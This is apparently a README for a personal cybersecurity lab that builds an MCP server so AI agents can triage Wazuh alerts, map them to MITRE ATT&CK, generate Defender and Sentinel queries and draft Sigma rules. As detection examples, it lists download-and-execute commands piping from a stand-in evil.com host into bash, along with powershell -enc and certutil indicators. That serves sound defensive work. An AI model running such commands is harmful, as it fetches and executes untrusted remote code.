# AI Agent MCP Lab

A hands-on cybersecurity and AI engineering lab focused on learning how AI Agents, the Model Context Protocol (MCP), and custom security tooling can be used to automate and enhance Security Operations Center (SOC) investigations.

This project demonstrates how AI agents can move beyond simple chat interactions by using MCP tools to perform structured security workflows, triage alerts, generate investigations, recommend actions, and assist analysts during incident response.

---

# Portfolio Highlights

This project demonstrates:

- Custom Python MCP Server Development
- AI Agent Tool Orchestration
- Security Workflow Automation
- Wazuh Alert Parsing and Analysis
- MITRE ATT&CK Mapping
- Detection Engineering Concepts
- Microsoft Defender Query Generation
- Azure Sentinel Query Generation
- Analyst Decision Support
- AI-Assisted SOC Investigations

Key capabilities include:

- Alert Classification and Routing
- SSH Authentication Failure Investigations
- Suspicious Command Execution Investigations
- Severity and Confidence Scoring
- Investigation Summary Generation
- Security Ticket Generation
- Analyst Action Recommendations
- Security Query Generation

---

# Project Goals

This lab focuses on:

- Learning AI Agent fundamentals
- Understanding MCP architecture
- Building custom MCP servers with Python
- Creating AI-assisted security workflows
- Practicing SOC investigation automation
- Developing reusable security tooling
- Exploring Detection Engineering concepts
- Understanding how AI can support cybersecurity operations

Rather than building a large infrastructure environment, this project focuses on practical AI engineering concepts that can be applied to real-world cybersecurity operations.

---

# Learning Objectives

By completing this lab, I learned:

- What AI agents are
- How MCP works
- How AI models interact with tools
- How to build custom MCP servers
- How to expose Python functions as MCP tools
- How tool orchestration differs from traditional automation
- How AI can assist SOC investigations
- How to structure security workflows using AI
- How to build alert routing workflows
- How to integrate MITRE ATT&CK mappings into investigations

---

# MCP Concepts Learned

## Traditional AI Chat

```text
User
  ↓
AI Model
  ↓
Response
```

The model can only reason about information provided in the conversation.

---

## AI Agent + MCP

```text
User
  ↓
AI Model
  ↓
MCP Tool Calls
  ↓
External Data / Functions
  ↓
Response
```

MCP allows AI models to use tools instead of relying only on conversation context.

---

# Current Architecture

Alert
↓
Investigation Workflow
↓
Investigation Summary
↓
Recommended Queries
↓
Next Action Recommendation
↓
Detection Recommendation
↓
SOC Investigation Package

````

---

# Example Investigation Flow

```text
Wazuh Alert
    ↓
identify_alert_type
    ↓
investigate_ssh_alert
    ↓
parse_wazuh_alert
    ↓
score_ssh_alert
    ↓
generate_investigation_summary
    ↓
generate_wazuh_query
    ↓
generate_defender_kql
    ↓
recommend_next_action
    ↓
generate_soc_ticket_note
````

---

# Project Structure

```text
ai-agent-mcp-lab/
├── .cursor/
│   ├── mcp.json
│   └── rules/
│       └── ai-agent-lab.mdc
├── docs/
│   └── project_context.md
├── notes/
│   └── lab_journal.md
├── sample_data/
│   ├── wazuh_alert.json
│   └── command_execution_alert.json
├── scripts/
│   └── soc_mcp_server.py
├── .gitignore
├── LICENSE
└── README.md
```

---

# Custom MCP Server

This project includes a custom Python MCP server:

```text
soc-assistant
```

Built using:

```text
Python
MCP Python SDK
Cursor
```

The MCP server exposes security-focused tools that can be called directly by AI agents.

---

# Current MCP Tools

## Alert Routing

### identify_alert_type

Purpose:

Classify incoming Wazuh alerts and route them to the appropriate investigation workflow.

Supported Alert Types:

| Alert Type                   | Workflow                      |
| ---------------------------- | ----------------------------- |
| ssh_auth_failure             | investigate_ssh_alert         |
| suspicious_command_execution | investigate_command_execution |
| unknown                      | manual_review                 |

---

## Investigation Workflows

### investigate_ssh_alert

Purpose:

Perform end-to-end triage for SSH authentication failures.

Returns:

- Alert Summary
- Risk Score
- Investigation Summary
- Recommended Queries
- Next Action

Workflow:

```text
Parse Alert
↓
Score Alert
↓
Generate Investigation Summary
↓
Generate Queries
↓
Recommend Next Action
↓
Return Investigation Package
```

---

### investigate_command_execution

Purpose:

Investigate suspicious command execution activity.

Supported Indicators:

- curl
- wget
- powershell
- certutil
- encoded commands
- bash execution
- download-and-execute patterns

Example:

```bash
curl http://evil.com/payload.sh | bash
```

Outputs:

- Command Summary
- Suspicious Indicators
- MITRE ATT&CK Mapping
- Severity
- Confidence Score
- Priority
- Recommended Queries
- Recommended Actions
- Analyst Notes

---

## Investigation Helpers

### parse_wazuh_alert

Extracts observables from Wazuh alerts:

- Source IP
- Source Port
- User
- Host
- Rule ID
- Rule Description
- Decoder
- Raw Log

---

### score_ssh_alert

Calculates:

- Severity
- Confidence
- Priority

Factors include:

- Root account targeting
- Failed login volume
- Success-after-failure activity
- Known administrative hosts

---

### generate_investigation_summary

Creates:

- Executive Summary
- Risk Assessment
- Recommended Actions
- Analyst Notes

---

### generate_soc_ticket_note

Creates analyst-ready documentation for:

- ServiceNow
- Jira
- IBM SOAR
- Incident Tracking Systems

Includes:

- Summary
- Observables
- Severity
- Analysis
- Recommended Actions
- Next Steps

---

### recommend_next_action

Provides analyst guidance based on:

- Severity
- Confidence
- Priority

Example recommendations:

| Confidence | Recommendation                        |
| ---------- | ------------------------------------- |
| 80+        | Escalate and begin containment review |
| 60-79      | Gather additional evidence            |
| <60        | Continue investigation                |

---

### generate_wazuh_query

Generates:

- OpenSearch JSON queries
- Wazuh Discover filters
- Investigation guidance

---

### generate_defender_kql

Generates:

- Microsoft Defender Advanced Hunting KQL
- Azure Sentinel Syslog KQL
- Investigation guidance

---

### generate_detection_recommendation

Purpose:

Recommend detection engineering improvements based on investigation findings.

Inputs:

- Alert Type
- Severity
- Confidence Score
- MITRE Techniques

Outputs:

- Detection Gaps
- Recommended Detections
- Telemetry Recommendations
- MITRE Coverage
- Engineering Notes

Examples:

SSH Authentication Failures:

- Brute-force correlation detections
- Success-after-failure detections
- Root login anomaly detections

Suspicious Command Execution:

- Download-and-execute detections
- PowerShell encoded command detections
- Certutil abuse detections
- Command-line monitoring recommendations

---

# Current Supported Alert Types

## SSH Authentication Failure

Examples:

```text
Failed password
sshd authentication failure
Brute force attempts
Root login attempts
```

Workflow:

```text
investigate_ssh_alert
```

---

## Suspicious Command Execution

Examples:

```text
curl http://evil.com | bash
wget payload.sh
powershell -enc
certutil download
```

Workflow:

```text
investigate_command_execution
```

### generate_sigma_rule

Generates beginner-friendly Sigma detection rule drafts from supported alert types.

Supported use cases:

- SSH authentication failures
- Suspicious command execution
- Linux download-and-execute behavior

Outputs:

- Sigma YAML rule draft
- MITRE ATT&CK tags
- False positive guidance
- Analyst notes

This tool does not deploy detections automatically. Rules should be reviewed, tested, tuned, and converted to the target SIEM format before production use.

### generate_detection_package

Bundles detection engineering outputs into a single package.

Reuses:

- generate_detection_recommendation
- generate_sigma_rule

Outputs:

- Detection Recommendations
- Sigma Rule Draft
- Engineering Summary

Purpose:

Helps move from alert investigation to detection engineering by identifying detection gaps, recommending improved coverage, and drafting Sigma detection logic.

---

# Key Security Concepts Practiced

- Alert Triage
- Incident Prioritization
- Security Automation
- Detection Engineering
- Wazuh Investigations
- MITRE ATT&CK Mapping
- OpenSearch Query Development
- Microsoft Defender Hunting
- Azure Sentinel Hunting
- AI-Assisted SOC Workflows
- MCP Tool Orchestration
- Security Workflow Routing

---

# Current Project Status

Completed:

✅ Custom Python MCP Server

✅ Wazuh Alert Parsing

✅ Alert Classification & Routing

✅ SSH Authentication Failure Workflow

✅ Suspicious Command Execution Workflow

✅ Severity & Confidence Scoring

✅ MITRE ATT&CK Mapping

✅ OpenSearch Query Generation

✅ Defender KQL Generation

✅ Sentinel Query Generation

✅ Investigation Summary Generation

✅ SOC Ticket Note Generation

✅ Analyst Decision Recommendations

✅ Detection Engineering Recommendations

✅ Detection Recommendations Embedded in Investigation Workflows

---

# Planned Future Enhancements

- Malware Investigation Workflow
- PowerShell Investigation Workflow
- Privilege Escalation Workflow
- Persistence Detection Workflow
- Threat Intelligence Enrichment
- IOC Reputation Lookups
- QRadar AQL Query Generation
- Splunk SPL Query Generation
- Multi-Alert Correlation
- Detection Engineering Recommendations
- Security Copilot-Style Investigation Chains
- Integration with Future AI Security Labs

---

# Lessons Learned

The most important takeaway from this lab:

```text
AI reasons.
MCP tools perform actions.
Workflows combine tools into useful outcomes.
```

This project demonstrates how AI agents can augment security operations by combining reasoning, structured tooling, and repeatable workflows.

---

# Author

Sydney McGee

Cybersecurity Analyst | Security Automation Enthusiast | AI Security Engineering Learner

Current Focus:

- AI Agents
- MCP
- Security Automation
- Detection Engineering
- Security Engineering
- AI Security Engineering
- SOC Workflow Automation
